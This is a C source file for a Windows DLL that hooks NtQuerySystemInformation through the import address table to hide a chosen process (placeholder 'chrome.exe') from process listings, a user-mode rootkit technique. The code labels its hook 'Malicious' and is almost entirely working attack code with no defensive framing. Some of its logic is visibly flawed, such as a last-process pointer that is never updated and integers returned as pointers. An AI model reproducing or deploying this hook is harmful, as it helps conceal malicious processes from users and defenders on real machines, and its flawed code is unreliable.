#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <winternl.h>
#include <stdbool.h>


#pragma comment(lib,"ntdll.lib")


//type of "NtQuerySystemInformation"
typedef NTSTATUS(__stdcall* NtQuerySystemInformationFuncType) (SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

NtQuerySystemInformationFuncType realNtQuerySystemInformation;
NTSTATUS __stdcall MaliciousNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

IMAGE_THUNK_DATA32* find_iat_entry(char* dllName, char* funcName);
void hook_function(IMAGE_THUNK_DATA32* thunk, NtQuerySystemInformationFuncType MaliciousFunction);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		IMAGE_THUNK_DATA32 *thunkOfRealNtQuerySystemInformation = find_iat_entry("ntdll.dll", "NtQuerySystemInformation");
		if (thunkOfRealNtQuerySystemInformation != 1) { //if the thunk exists
			hook_function(thunkOfRealNtQuerySystemInformation, MaliciousNtQuerySystemInformation);
		}
		break;
	default:
		break;
	}

	return TRUE;
}


IMAGE_THUNK_DATA32* find_iat_entry(char* dllName, char* funcName) {
	HMODULE hModule = GetModuleHandleA(NULL); //get the handle of the calling process

	//arrive to IMAGE_IMPORT_DESCRIPTOR array
	IMAGE_DOS_HEADER* image_dos_header = (IMAGE_DOS_HEADER*)hModule;
	byte* image_base = (byte*)image_dos_header;
	IMAGE_NT_HEADERS32* image_nt_headers32 = (IMAGE_NT_HEADERS32*)(image_base + (image_dos_header->e_lfanew));
	IMAGE_OPTIONAL_HEADER* image_optional_header = &image_nt_headers32->OptionalHeader;
	IMAGE_DATA_DIRECTORY* image_data_directory_import = &(image_optional_header->DataDirectory[1]);
	byte* image_data_directory_import_virtual_address_in_RAM = image_base + image_data_directory_import->VirtualAddress;
	IMAGE_IMPORT_DESCRIPTOR* image_import_descriptor = (IMAGE_IMPORT_DESCRIPTOR*)image_data_directory_import_virtual_address_in_RAM;

	while ((image_import_descriptor->Name != 0) && (strcmp((char*)(image_base + image_import_descriptor->Name), dllName) != 0)) {
		image_import_descriptor += 1;
	}

	if (image_import_descriptor->Name == 0) {	//if we did not encounter the desirable dll in the array
		printf("%s\r\n", "[*] There is no such dll");
		return 1;
	}

	IMAGE_THUNK_DATA32* original_thunk = (IMAGE_THUNK_DATA32*)(image_base + image_import_descriptor->OriginalFirstThunk);
	IMAGE_THUNK_DATA32* thunk = (IMAGE_THUNK_DATA32*)(image_base + image_import_descriptor->FirstThunk);

	while ((original_thunk->u1.ForwarderString != 0) && (strcmp((char*)(image_base + original_thunk->u1.ForwarderString + 2), funcName) != 0)) {
		original_thunk += 1;
		thunk += 1;
	}

	if (original_thunk->u1.ForwarderString == 0) {	//if we did not encounter the desirable function of the dll
		printf("%s\r\n", "[*] There is no such function");
		return 1;
	}

	return thunk;
}


void hook_function(IMAGE_THUNK_DATA32* thunk, NtQuerySystemInformationFuncType MaliciousFunction) {
	DWORD junk = 1337;
	VirtualProtect((int)thunk - (int)thunk % 0x1000, 0x1000, PAGE_READWRITE, &junk);

	//replace "NtQuerySystemInformation" with the malicious function
	realNtQuerySystemInformation = thunk->u1.Function;
	thunk->u1.Function = MaliciousFunction;
}


NTSTATUS __stdcall MaliciousNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
	if (SystemInformationClass != SystemProcessInformation) {
		return realNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	}

	int returnLength = 0;
	SYSTEM_PROCESS_INFORMATION* processesBuffer = (SYSTEM_PROCESS_INFORMATION*) malloc(SystemInformationLength);
	SYSTEM_PROCESS_INFORMATION* startOfProcessesBuffer = processesBuffer;
	NTSTATUS status = NtQuerySystemInformation(SystemInformationClass, (PVOID) processesBuffer, SystemInformationLength, &returnLength);
	
	if (NT_SUCCESS(status)) {
		//the first entry is the System Idle Process so we do not hide it
		memcpy(SystemInformation, processesBuffer, processesBuffer->NextEntryOffset);
		
		SYSTEM_PROCESS_INFORMATION* lastProcessInfo = processesBuffer; //save the last process that had been copied, in order to maintain NextEntryOffset member in case the last process is hidden

		byte isLastHidden = 1;
		SystemInformation = ((byte*) SystemInformation) + processesBuffer->NextEntryOffset;
		
		while (processesBuffer->NextEntryOffset != 0) { //traverse the process list until we reach the end
			processesBuffer = ((byte*) processesBuffer) + processesBuffer->NextEntryOffset;
			if (wcscmp(L"chrome.exe", processesBuffer->ImageName.Buffer) != 0) { //replace "chrome.exe" with the name of the process to hide
				
				if (processesBuffer->NextEntryOffset != 0) { //if this is not the last process in the buffer, proceed further
					memcpy(SystemInformation, processesBuffer, processesBuffer->NextEntryOffset);
					//the string of the process's name is stored in the buffer, after (not sequentially) the process's structure (SYSTEM_PROCESS_INFORMATION)
					((SYSTEM_PROCESS_INFORMATION*)SystemInformation)->ImageName.Buffer = ((byte*) SystemInformation) + (int)((byte*)(processesBuffer->ImageName.Buffer)) - ((byte*)processesBuffer);
					SystemInformation = ((byte*) SystemInformation) + processesBuffer->NextEntryOffset;
				} else { //else, copy the rest of the buffer and mark that the last process is not hidden
					memcpy(SystemInformation, processesBuffer, SystemInformationLength -(((byte*) processesBuffer) - ((byte*) startOfProcessesBuffer)));
					//the string of the process's name is stored in the buffer, after (not sequentially) the process's structure (SYSTEM_PROCESS_INFORMATION)
					((SYSTEM_PROCESS_INFORMATION*)SystemInformation)->ImageName.Buffer = ((byte*)SystemInformation) + (int)((byte*)(processesBuffer->ImageName.Buffer)) - ((byte*)processesBuffer);
					isLastHidden = 0; //we arrive to the last process, so it is not hidden
				}
			}
		}

		//set NextEntryOffset member of the last process that is not hidden to 0, if necessary
		if (isLastHidden == 1) {
			lastProcessInfo->NextEntryOffset = 0;
		}
	}

	free(startOfProcessesBuffer);
	*(ReturnLength) = returnLength;
	return status;
}


